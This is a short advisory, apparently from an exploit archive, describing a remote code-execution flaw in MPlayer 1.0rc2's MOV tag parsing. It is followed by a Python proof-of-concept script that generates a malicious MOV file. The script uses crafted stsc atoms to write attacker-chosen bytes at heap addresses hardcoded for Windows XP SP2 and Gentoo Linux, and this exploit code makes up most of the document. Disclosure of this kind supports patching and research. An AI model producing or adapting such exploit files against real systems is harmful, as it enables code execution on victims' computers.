source: http://www.securityfocus.com/bid/27499/info

MPlayer is prone to a remote code-execution vulnerability because it fails to sanitize certain 'MOV' file tags before using them to index heap memory.

An attacker can exploit this issue to execute arbitrary code, which can result in the complete compromise of the computer. Failed exploit attempts will result in a denial-of-service condition.

This issue affects MPlayer 1.0rc2; other versions may also be affected. 

#!/bin/python

import struct
import sys

def mkatom(type,data):
     if len(type) != 4:
         raise "type must by of length 4!!!"
     mov = ""
     mov += struct.pack(">L",len(data)+8)
     mov += type
     mov += data
     return mov

def poc(address, block_size):

     what=struct.pack(">L", 0x41414141) * 2 # Writes an 8 bytes chunk
     base= ((address - 8) / block_size) +1

     ftyp = mkatom("ftyp","3gp4"+"\x00\x00\x02\x00"+"3gp4"+"3gp33gp23gp1")
     mdat = mkatom("mdat","MALDAAAAAD!")
     stsc  = mkatom("stsc",struct.pack(">L",1) + \
                     struct.pack(">L",2) + \
                     struct.pack(">L",base) + \
                     what + \
                     struct.pack(">L",base+300)+what)
     trak = mkatom("trak",stsc)
     moov = mkatom("moov",trak)

     file = ftyp + mdat + moov
     return file

try:
     if sys.argv[2] != "linux":
         evilness = poc(0x0122e000, 24)     #Windows XP SP2 Prof. ES
     else:
         evilness = poc(0x088aa020, 20)     #Linux Gentoo

     print "[+] Generating file: %s" % sys.argv[1]
     file = open(sys.argv[1], "wb")
     file.write(evilness)
     file.close()
     print "[+] Done."

except Exception, e:
     print "[+] Usage: python mplayer_poc.py filename.mov windows (For
WinXP Prof SP2 ES)"
     print "           python mplayer_poc.py filename.mov linux     (For
Linux Gentoo)"